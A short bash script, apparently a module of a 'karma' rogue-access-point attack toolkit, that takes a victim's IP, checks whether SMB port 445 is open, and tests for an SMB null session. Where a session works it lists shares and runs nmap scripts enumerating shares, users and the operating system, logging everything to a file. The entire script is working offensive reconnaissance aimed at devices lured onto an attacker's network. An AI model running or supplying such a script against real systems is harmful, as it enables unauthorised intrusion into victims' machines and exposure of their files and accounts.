#!/bin/bash
# Args: $1=IP  $2=MAC  $3=ATTACKER_IP
# Env:  KARMA_OUT

WAIT=2
DPORT=445
TIME="$(date +'%H:%M:%S_%d.%m.%Y')"
OUT="${KARMA_OUT:-$(dirname "$0")/..}"
mkdir -p "$OUT"
OUTFILE="$OUT/smb-${1}_${TIME}.txt"

if ! nc -nw $WAIT "$1" $DPORT </dev/null 2>/dev/null; then
	exit 0
fi

echo "[*] checking SMB null session on $1" | tee "$OUTFILE"

if smbclient -U '%' -L "$1" -N 2>/dev/null | grep -q 'Sharename'; then
	echo "[+] SMB null session works on $1 — enumerating shares" | tee -a "$OUTFILE"
	smbclient -U '%' -L "$1" -N 2>/dev/null | tee -a "$OUTFILE"
	nmap -Pn -n -p 445 "$1" --script 'smb-enum-shares,smb-enum-users,smb-os-discovery' \
		2>/dev/null | tee -a "$OUTFILE"
else
	echo "[-] SMB null session denied on $1" | tee -a "$OUTFILE"
fi
